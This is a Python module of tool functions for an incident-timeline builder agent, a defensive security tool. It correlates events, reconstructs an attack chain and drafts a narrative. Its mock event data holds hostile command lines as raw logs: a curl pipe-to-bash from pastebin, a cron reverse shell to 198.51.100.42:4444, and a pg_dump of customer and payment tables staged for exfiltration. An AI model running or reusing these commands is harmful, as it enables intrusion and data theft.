"""Incident Timeline Builder Agent — Tool functions."""

from __future__ import annotations

import hashlib
import random
from typing import Any

import structlog

from .models import (
    CorrelatedEvent,
    EventSeverity,
    EventSource,
    IncidentNarrative,
    RawEvent,
    RootCauseAnalysis,
    TimelineEntry,
)

logger = structlog.get_logger()

_MOCK_EVENTS: list[dict[str, Any]] = [
    {
        "source": EventSource.SIEM,
        "timestamp": "2026-03-30T02:14:00Z",
        "severity": EventSeverity.INFO,
        "host": "web-prod-01",
        "user": "svc-deploy",
        "action": "ssh_login",
        "description": "SSH login from 198.51.100.42",
        "raw_log": ("sshd: Accepted publickey for svc-deploy from 198.51.100.42 port 44221"),
    },
    {
        "source": EventSource.EDR,
        "timestamp": "2026-03-30T02:15:12Z",
        "severity": EventSeverity.MEDIUM,
        "host": "web-prod-01",
        "user": "svc-deploy",
        "action": "process_create",
        "description": "curl downloading script from pastebin",
        "raw_log": ("curl -s https://pastebin.com/raw/xK9mZ3 | bash"),
    },
    {
        "source": EventSource.NETWORK,
        "timestamp": "2026-03-30T02:15:30Z",
        "severity": EventSeverity.HIGH,
        "host": "web-prod-01",
        "user": "",
        "action": "dns_query",
        "description": "DNS query to known C2 domain",
        "raw_log": ("DNS query: c2-relay.darknet.example.com A record from 10.0.1.15"),
    },
    {
        "source": EventSource.CLOUD_TRAIL,
        "timestamp": "2026-03-30T02:16:45Z",
        "severity": EventSeverity.CRITICAL,
        "host": "web-prod-01",
        "user": "svc-deploy",
        "action": "iam_role_assume",
        "description": "AssumeRole to admin-full-access",
        "raw_log": ("sts:AssumeRole arn:aws:iam::123456789012:role/admin-full-access"),
    },
    {
        "source": EventSource.IDENTITY,
        "timestamp": "2026-03-30T02:17:00Z",
        "severity": EventSeverity.HIGH,
        "host": "web-prod-01",
        "user": "svc-deploy",
        "action": "privilege_escalation",
        "description": "Service account escalated to admin",
        "raw_log": ("identity: svc-deploy assumed admin-full-access role"),
    },
    {
        "source": EventSource.CLOUD_TRAIL,
        "timestamp": "2026-03-30T02:18:30Z",
        "severity": EventSeverity.CRITICAL,
        "host": "db-prod-01",
        "user": "svc-deploy",
        "action": "s3_exfil",
        "description": "Bulk S3 download from data lake",
        "raw_log": ("s3:GetObject x847 objects from s3://company-data-lake/pii/"),
    },
    {
        "source": EventSource.APPLICATION,
        "timestamp": "2026-03-30T02:19:15Z",
        "severity": EventSeverity.HIGH,
        "host": "web-prod-01",
        "user": "svc-deploy",
        "action": "config_change",
        "description": "Security group modified to allow 0.0.0.0/0",
        "raw_log": ("ec2:AuthorizeSecurityGroupIngress sg-0abc123 0.0.0.0/0:443"),
    },
    {
        "source": EventSource.EDR,
        "timestamp": "2026-03-30T02:20:00Z",
        "severity": EventSeverity.CRITICAL,
        "host": "web-prod-01",
        "user": "root",
        "action": "persistence",
        "description": "Cron job added for reverse shell",
        "raw_log": ("crontab: new entry: */5 * * * * /tmp/.x connect 198.51.100.42 4444"),
    },
    {
        "source": EventSource.NETWORK,
        "timestamp": "2026-03-30T02:21:00Z",
        "severity": EventSeverity.HIGH,
        "host": "web-prod-01",
        "user": "",
        "action": "lateral_movement",
        "description": "SSH from web-prod-01 to db-prod-01",
        "raw_log": ("netflow: 10.0.1.15:22 -> 10.0.2.10:22 bytes=4096"),
    },
    {
        "source": EventSource.SIEM,
        "timestamp": "2026-03-30T02:22:30Z",
        "severity": EventSeverity.CRITICAL,
        "host": "db-prod-01",
        "user": "svc-deploy",
        "action": "data_access",
        "description": "Bulk database export triggered",
        "raw_log": ("pg_dump customers orders payments | gzip > /tmp/exfil.gz"),
    },
]


def _gen_id(prefix: str, seed: str, idx: int) -> str:
    raw = f"{seed}:{idx}"
    h = hashlib.sha256(raw.encode()).hexdigest()[:8]
    return f"{prefix}-{h.upper()}"


class IncidentTimelineBuilderToolkit:
    """Tools for incident timeline reconstruction."""

    def __init__(
        self,
        siem_client: Any | None = None,
        edr_client: Any | None = None,
    ) -> None:
        self._siem_client = siem_client
        self._edr_client = edr_client

    async def collect_events(
        self,
        incident_id: str,
        tenant_id: str,
    ) -> list[RawEvent]:
        """Collect raw events from all sources."""
        logger.info(
            "itb.collect_events",
            incident_id=incident_id,
            tenant_id=tenant_id,
        )

        if self._siem_client is not None:
            try:
                raw = await self._siem_client.get_events(
                    incident_id=incident_id,
                )
                return [RawEvent(**r) for r in raw]
            except Exception:
                logger.exception(
                    "itb.collect_events.error",
                )

        events: list[RawEvent] = []
        for i, evt in enumerate(_MOCK_EVENTS):
            noise_secs = random.randint(  # noqa: S311
                0,
                5,
            )
            events.append(
                RawEvent(
                    id=_gen_id("EVT", incident_id, i),
                    source=evt["source"],
                    timestamp=evt["timestamp"],
                    severity=evt["severity"],
                    host=evt["host"],
                    user=evt["user"],
                    action=evt["action"],
                    description=evt["description"],
                    raw_log=evt["raw_log"],
                    metadata={
                        "noise_offset_s": noise_secs,
                        "alert_id": _gen_id(
                            "ALR",
                            incident_id,
                            i,
                        ),
                    },
                )
            )
        return events

    async def correlate_events(
        self,
        events: list[RawEvent],
    ) -> list[CorrelatedEvent]:
        """Correlate events across sources."""
        logger.info(
            "itb.correlate_events",
            count=len(events),
        )

        by_host: dict[str, list[RawEvent]] = {}
        for e in events:
            by_host.setdefault(e.host, []).append(e)

        correlated: list[CorrelatedEvent] = []
        for idx, (host, host_events) in enumerate(
            by_host.items(),
        ):
            sources = list(
                {e.source for e in host_events},
            )
            max_sev = _max_severity(host_events)
            score = round(
                min(1.0, len(sources) * 0.25),
                2,
            )
            users = list(
                {e.user for e in host_events if e.user},
            )

            correlated.append(
                CorrelatedEvent(
                    id=_gen_id("COR", host, idx),
                    event_ids=[e.id for e in host_events],
                    sources=sources,
                    timestamp=host_events[0].timestamp,
                    severity=max_sev,
                    host=host,
                    user=(users[0] if users else ""),
                    action=host_events[0].action,
                    description=(
                        f"{len(host_events)} events on {host} across {len(sources)} sources"
                    ),
                    correlation_score=score,
                )
            )
        return correlated

    async def build_timeline(
        self,
        correlated: list[CorrelatedEvent],
        raw_events: list[RawEvent],
    ) -> list[TimelineEntry]:
        """Build a chronological timeline."""
        logger.info(
            "itb.build_timeline",
            correlated=len(correlated),
        )

        sorted_events = sorted(
            raw_events,
            key=lambda e: e.timestamp,
        )
        entries: list[TimelineEntry] = []
        for i, evt in enumerate(sorted_events):
            cor_id = ""
            for c in correlated:
                if evt.id in c.event_ids:
                    cor_id = c.id
                    break
            entries.append(
                TimelineEntry(
                    id=_gen_id("TLE", evt.id, i),
                    timestamp=evt.timestamp,
                    severity=evt.severity,
                    title=evt.action,
                    description=evt.description,
                    sources=[evt.source],
                    actors=([evt.user] if evt.user else []),
                    affected_hosts=[evt.host],
                    correlated_event_id=cor_id,
                )
            )
        return entries

    async def identify_root_cause(
        self,
        timeline: list[TimelineEntry],
        correlated: list[CorrelatedEvent],
    ) -> RootCauseAnalysis:
        """Identify probable root cause."""
        logger.info(
            "itb.identify_root_cause",
            entries=len(timeline),
        )

        first = timeline[0] if timeline else None
        confidence = round(
            random.uniform(0.7, 0.95),  # noqa: S311
            2,
        )

        techniques = [
            "T1078 (Valid Accounts)",
            "T1059 (Command & Scripting)",
            "T1071 (Application Layer Protocol)",
            "T1098 (Account Manipulation)",
            "T1537 (Transfer Data to Cloud)",
        ]

        return RootCauseAnalysis(
            probable_cause=(
                "Compromised service account credentials "
                "used for initial access via SSH, followed "
                "by privilege escalation and data "
                "exfiltration"
            ),
            confidence=confidence,
            attack_vector="compromised_credentials",
            initial_access_time=(first.timestamp if first else ""),
            initial_access_host=(first.affected_hosts[0] if first and first.affected_hosts else ""),
            contributing_factors=[
                "Service account with excessive privileges",
                "No MFA on SSH access",
                "Overly permissive IAM role trust policy",
                "Lack of network segmentation",
            ],
            mitre_techniques=techniques,
        )

    async def generate_narrative(
        self,
        timeline: list[TimelineEntry],
        root_cause: RootCauseAnalysis,
    ) -> IncidentNarrative:
        """Generate a human-readable narrative."""
        logger.info(
            "itb.generate_narrative",
            entries=len(timeline),
        )

        entry_count = len(timeline)
        host_set = set()
        actor_set = set()
        for t in timeline:
            host_set.update(t.affected_hosts)
            actor_set.update(t.actors)

        return IncidentNarrative(
            executive_summary=(
                f"Incident involving {entry_count} events "
                f"across {len(host_set)} hosts. "
                f"Root cause: {root_cause.probable_cause}"
            ),
            detailed_narrative=(
                f"At {root_cause.initial_access_time}, "
                f"an attacker gained access to "
                f"{root_cause.initial_access_host} via "
                f"{root_cause.attack_vector}. "
                f"The attack progressed through "
                f"{entry_count} observed events "
                f"involving actors: "
                f"{', '.join(actor_set)}."
            ),
            impact_assessment=(
                f"Affected hosts: {', '.join(host_set)}. "
                f"Data exfiltration suspected from "
                f"production data lake and databases."
            ),
            recommendations=[
                "Rotate all affected service account keys",
                "Enforce MFA on all SSH access",
                "Restrict IAM role trust policies",
                "Implement network segmentation",
                "Deploy real-time exfiltration detection",
            ],
        )


def _max_severity(
    events: list[RawEvent],
) -> EventSeverity:
    """Return highest severity among events."""
    order = [
        EventSeverity.CRITICAL,
        EventSeverity.HIGH,
        EventSeverity.MEDIUM,
        EventSeverity.LOW,
        EventSeverity.INFO,
    ]
    for sev in order:
        if any(e.severity == sev for e in events):
            return sev
    return EventSeverity.INFO
